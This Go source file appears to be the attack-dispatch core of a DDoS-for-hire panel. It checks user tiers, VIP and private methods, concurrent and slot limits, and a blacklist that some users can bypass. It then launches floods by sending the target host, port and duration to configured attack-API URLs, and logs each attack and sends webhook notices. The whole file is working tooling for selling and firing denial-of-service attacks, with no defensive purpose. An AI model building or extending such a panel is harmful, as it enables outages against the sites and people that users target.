package core

import (
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type AttackManager struct {
	config *Config
	db     *Database
}

func NewAttackManager(cfg *Config, db *Database) *AttackManager {
	return &AttackManager{config: cfg, db: db}
}

func (am *AttackManager) SetConfig(cfg *Config) {
	am.config = cfg
}

func (am *AttackManager) SendAttack(s *Session, method, host string, port, duration int) error {
	_, _, err := am.SendAttackForUser(s.user, s.webhooks, method, host, port, duration)
	return err
}

// SendAttackForUser runs the same validation and dispatch as the SSH panel (API, etc.).
// Logs to the database before firing outbound dispatch URLs so ongoing/slots survive process restarts.
func (am *AttackManager) SendAttackForUser(u *User, wh *WebhookManager, method, host string, port, duration int) (logID int64, timeSent int64, err error) {
	if !am.config.AttackSettings.Attacks.Enabled {
		return 0, 0, NewAttackErr("attacks_disabled", nil)
	}

	attackDef := am.config.FindAttack(method)
	if attackDef == nil {
		return 0, 0, NewAttackErr("unknown_method", nil)
	}

	if !attackDef.Config.Status.Enabled {
		return 0, 0, NewAttackErr("method_disabled", map[string]string{"method": attackDef.Method})
	}

	if attackDef.Config.Status.VIP && !u.VIP && !u.Admin {
		return 0, 0, NewAttackErr("vip_required", nil)
	}

	if attackDef.Config.Status.Private.Enabled {
		if !u.Admin && !isPrivateUser(attackDef.Config.Status.Private.Users, u.Username) {
			return 0, 0, NewAttackErr("private_method", nil)
		}
	}

	host = strings.TrimSpace(host)
	if err := ValidateAttackTargetHost(host); err != nil {
		return 0, 0, err
	}
	lookupHost := AttackTargetLookupName(host)
	if am.config.AttackSettings.BlockPrivateHosts && hostResolvesNonPublic(lookupHost) {
		return 0, 0, NewAttackErr("non_public_host", nil)
	}

	if err := am.checkBlacklist(u, host); err != nil {
		return 0, 0, err
	}

	if err := am.checkMaxTime(u, attackDef, duration); err != nil {
		return 0, 0, err
	}

	if duration > u.MaxTime {
		return 0, 0, NewAttackErr("duration_user_max", map[string]string{"max": fmt.Sprintf("%d", u.MaxTime)})
	}

	if err := am.checkConcurrents(u); err != nil {
		return 0, 0, err
	}

	if err := am.checkGlobalSlots(); err != nil {
		return 0, 0, err
	}

	if err := am.checkMethodSlots(attackDef); err != nil {
		return 0, 0, err
	}

	if err := am.checkGroupSlots(attackDef); err != nil {
		return 0, 0, err
	}

	if err := am.checkGroupMaxTime(attackDef, duration); err != nil {
		return 0, 0, err
	}

	if err := am.checkSpam(u, host); err != nil {
		return 0, 0, err
	}

	id, ts, logErr := am.db.LogAttack(u.Username, host, port, duration, method)
	if logErr != nil {
		logToFile("assets/logs/attacks.txt",
			fmt.Sprintf("[%s] DB_LOG_ERROR user=%s method=%s host=%s port=%d duration=%d err=%s",
				time.Now().Format("2006-01-02 15:04:05"), u.Username, method, host, port, duration, logErr.Error()))
		return 0, 0, NewAttackErr("db_log_failed", nil)
	}
	logID, timeSent = id, ts

	am.dispatchAttack(attackDef, host, port, duration)

	logToFile("assets/logs/attacks.txt",
		fmt.Sprintf("[%s] user=%s method=%s host=%s port=%d duration=%d log_id=%d [api/ssh]",
			time.Now().Format("2006-01-02 15:04:05"), u.Username, method, host, port, duration, logID))

	if wh != nil {
		go wh.SendAttackNotification(u.Username, host, method, port, duration)
	}

	return logID, timeSent, nil
}

func (am *AttackManager) checkBlacklist(u *User, host string) error {
	if u.BypassBlacklist {
		return nil
	}
	hostLower := strings.ToLower(host)
	for _, bl := range am.config.AttackSettings.Blacklists {
		if strings.Contains(hostLower, strings.ToLower(bl)) {
			return NewAttackErr("blacklisted", nil)
		}
	}
	return nil
}

func (am *AttackManager) checkMaxTime(u *User, atk *AttackDef, duration int) error {
	if atk.Config.MaxTime.Hard.Enabled {
		if duration > atk.Config.MaxTime.Hard.Time {
			return NewAttackErr("duration_hard", map[string]string{"max": fmt.Sprintf("%d", atk.Config.MaxTime.Hard.Time)})
		}
	}

	if atk.Config.MaxTime.Soft.Enabled && !u.BypassSoftMaxtime {
		if duration > atk.Config.MaxTime.Soft.Time {
			return NewAttackErr("duration_soft", map[string]string{"max": fmt.Sprintf("%d", atk.Config.MaxTime.Soft.Time)})
		}
	}

	return nil
}

func (am *AttackManager) checkConcurrents(u *User) error {
	ongoing, err := am.db.GetUserOngoingCount(u.Username)
	if err != nil {
		return NewAttackErr("internal_concurrents", nil)
	}
	if ongoing >= u.Concurrents {
		return NewAttackErr("concurrent_limit", map[string]string{"max": fmt.Sprintf("%d", u.Concurrents)})
	}
	return nil
}

func (am *AttackManager) checkGlobalSlots() error {
	if !am.config.AttackSettings.Attacks.Slots.Enabled {
		return nil
	}
	count, err := am.db.GetOngoingCount()
	if err != nil {
		return NewAttackErr("internal_global_slots", nil)
	}
	maxG := am.config.AttackSettings.Attacks.Slots.Max
	if count >= maxG {
		return NewAttackErr("global_slots_full", map[string]string{"used": fmt.Sprintf("%d", count), "max": fmt.Sprintf("%d", maxG)})
	}
	return nil
}

func (am *AttackManager) checkMethodSlots(atk *AttackDef) error {
	if !atk.Config.Slots.Enabled {
		return nil
	}
	count, err := am.db.GetMethodOngoingCount(atk.Method)
	if err != nil {
		return NewAttackErr("internal_method_slots", nil)
	}
	maxM := atk.Config.Slots.Max
	if count >= maxM {
		return NewAttackErr("method_slots_full", map[string]string{
			"method": atk.Method,
			"used":   fmt.Sprintf("%d", count),
			"max":    fmt.Sprintf("%d", maxM),
		})
	}
	return nil
}

func (am *AttackManager) checkGroupSlots(atk *AttackDef) error {
	if atk.Group == "" {
		return nil
	}
	group := am.config.FindMethodGroup(atk.Group)
	if group == nil || group.MaxSlots <= 0 {
		return nil
	}
	methods := am.config.GetGroupMethods(atk.Group)
	count, err := am.db.GetGroupOngoingCount(methods)
	if err != nil {
		return NewAttackErr("internal_group_slots", nil)
	}
	maxS := group.MaxSlots
	if count >= maxS {
		return NewAttackErr("group_slots_full", map[string]string{
			"group": atk.Group,
			"used":  fmt.Sprintf("%d", count),
			"max":   fmt.Sprintf("%d", maxS),
		})
	}
	return nil
}

func (am *AttackManager) checkGroupMaxTime(atk *AttackDef, duration int) error {
	if atk.Group == "" {
		return nil
	}
	group := am.config.FindMethodGroup(atk.Group)
	if group == nil || group.MaxTime <= 0 {
		return nil
	}
	if duration > group.MaxTime {
		return NewAttackErr("group_maxtime", map[string]string{
			"group": atk.Group,
			"max":   fmt.Sprintf("%d", group.MaxTime),
		})
	}
	return nil
}

func (am *AttackManager) checkSpam(u *User, host string) error {
	spam := am.config.AttackSettings.Attacks.SpamCheck

	if spam.General.Enabled {
		count, err := am.db.GetSpamCount(u.Username, spam.General.PerSeconds)
		if err == nil && count >= spam.General.Amount {
			return NewAttackErr("spam_general", nil)
		}
	}

	if spam.Target.Enabled {
		count, err := am.db.GetTargetSpamCount(u.Username, host, spam.Target.PerSeconds)
		if err == nil && count >= spam.Target.Amount {
			return NewAttackErr("spam_target", nil)
		}
	}

	return nil
}

func (am *AttackManager) dispatchAttack(atk *AttackDef, host string, port, duration int) {
	client := &http.Client{Timeout: 15 * time.Second}

	for _, link := range atk.Links {
		url := link
		url = strings.ReplaceAll(url, "{HOST}", host)
		url = strings.ReplaceAll(url, "{PORT}", fmt.Sprintf("%d", port))
		url = strings.ReplaceAll(url, "{TIME}", fmt.Sprintf("%d", duration))
		url = strings.ReplaceAll(url, "{METHOD}", atk.Method)

		go func(u string) {
			resp, err := client.Get(u)
			if err != nil {
				return
			}
			resp.Body.Close()
		}(url)
	}
}

func hostResolvesNonPublic(host string) bool {
	host = strings.TrimSpace(host)
	if host == "" {
		return true
	}
	if strings.EqualFold(host, "localhost") {
		return true
	}
	if ip := net.ParseIP(host); ip != nil {
		return ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsUnspecified()
	}
	ips, err := net.LookupIP(host)
	if err != nil || len(ips) == 0 {
		return false
	}
	for _, ip := range ips {
		if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() || ip.IsUnspecified() {
			return true
		}
	}
	return false
}

func isPrivateUser(users []string, username string) bool {
	for _, u := range users {
		if strings.EqualFold(u, username) {
			return true
		}
	}
	return false
}

func logToFile(path, message string) {
	os.MkdirAll(filepath.Dir(path), 0755)

	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	f.WriteString(message + "\n")
}
